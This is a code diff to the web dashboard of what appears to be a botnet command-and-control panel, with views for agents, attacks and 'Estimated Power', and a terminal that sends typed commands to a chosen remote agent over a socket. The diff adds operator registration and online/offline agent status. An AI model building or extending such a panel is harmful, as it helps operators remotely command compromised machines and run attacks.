@@ -70,7 +70,7 @@
                         <h2 class="mdl-card__title-text">Estimated Power</h2>
                       </div>
                       <div class="mdl-card__supporting-text">
-                        <center><h1>10gbs</h1><center>
+                        <center><h1>Null</h1><center>
                       </div>
 
                     </div>
@@ -105,7 +105,7 @@
             <thead>
               <tr>
                 <th class="mdl-data-table__cell--non-numeric">Agent Name</th>
-                <th>Uptime</th>
+                <th>Status</th>
                 <th>More</th>
               </tr>
             </thead>
@@ -117,7 +117,9 @@
       <!-- end of agent view-->
       <div id="agent-terminal-view" class="agent-terminal-view">
           <div class="agent-terminal-view-toolbar" id="agent-terminal-view-toolbar">
-              <button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent back-button "><i class="material-icons" role="presentation">arrow_back</i></button>
+            <button class="mdl-button mdl-js-button mdl-button--fab mdl-js-ripple-effect back-button" onclick="agentTerminalToolbarBackButton()">
+              <i class="material-icons">arrow_back</i>
+            </button>
           </div>
           <div class="terminal-container" id="terminal-container">
 
@@ -166,6 +168,7 @@ $(document).ready(function(){
   hideAllViews();
   uid = getCookie('uid')
   checkUserExist(uid).then(results => {
+    registerControlClient(uid);
     if(results == true){
       console.log("%cAUTHENTICATED", 'background: black; color:green;padding:3px;font-weight: bold')
       showDashboard()
@@ -215,6 +218,11 @@ function showAttacks(){
 function openSettings(){
   updateTitle('Settings')
   hideAllViews();
+}
+
+function agentTerminalToolbarBackButton(){
+  showView('#agent-view');
+  updateTitle('Agents')
 }
 
 function openResources(){
@@ -277,13 +285,22 @@ function showAgents(){
   updateTitle('Agents')
   console.log("%cShowAgents", 'color:#0077ee; background:black;padding:3px;')
   uid = getCookie('uid')
+  var status;
   checkUserExist(uid).then(results => {
     if(results == true){
       showView('#agent-view');
       $('#agent-view-table-body').empty();
       getAgents(uid).then(results => {
         results.forEach(result => {
-          $('#agent-view-table-body').append('<tr onclick="openAgentCMD(\'' + result.agentName + '\')"><td class="mdl-data-table__cell--non-numeric">'+result.agentName+'</td><td>25</td><td><button id="menu1" class="mdl-button mdl-js-button mdl-button--icon"><i class="material-icons">more_vert</i></button></td></tr>')
+          checkAgentOnline(uid, result._id).then(results => {
+            if(results == true){
+              status = '<b class="online-green">Online</b>'
+            }
+            if(results == false){
+              status = '<b class="offline-red">Offline</b>'
+            }
+            $('#agent-view-table-body').append('<tr onclick="openAgentCMD(\'' + result.agentName + '\')"><td class="mdl-data-table__cell--non-numeric">'+result.agentName+'</td><td>'+status+'</td><td><button id="menu1" class="mdl-button mdl-js-button mdl-button--icon"><i class="material-icons">more_vert</i></button></td></tr>')
+          })
         });
       })
     }else{
@@ -321,7 +338,8 @@ function openAgentCMD(agentName){
       let keysEntered = commandBuffer.join('')
       console.log(selectedAgent)
       console.log(keysEntered)
-      socket.emit('sendCmd', keysEntered, selectedAgent)
+      var controlClientUid = getCookie('uid')
+      socket.emit('sendCmd', keysEntered, selectedAgent, controlClientUid)
       //clear the buffer
       keysEntered = undefined;
       commandBuffer = [];
@@ -330,7 +348,7 @@ function openAgentCMD(agentName){
      // Do not delete the prompt
       commandBuffer.pop()
       term.write('\b\b')
-      if (term.x > 2) {
+      if (term.x > 1) {
         term.write('\b \b');
       }
     } else if (printable) {
@@ -413,6 +431,15 @@ function checkUserExist(uid){
     });
 }
 
+function registerControlClient(uid){
+  checkUserExist(uid).then(results => {
+    if(results == true){
+      socket.emit('registerControlClient',uid)
+    }else{
+      window.location = "/error.html"
+    }
+  })
+}
 
 //--- get Stats scripts ---//
 
@@ -420,6 +447,15 @@ function getAgents(uid){
   "use strict"
     return new Promise(resolve => {
         socket.emit('getAgents',uid, function(returnData){
+            resolve(returnData);
+        });
+    });
+}
+function checkAgentOnline(uid, agentId){
+  console.log('agent id ' + agentId)
+  "use strict"
+    return new Promise(resolve => {
+        socket.emit('checkAgentOnline',uid, agentId, function(returnData){
             resolve(returnData);
         });
     });
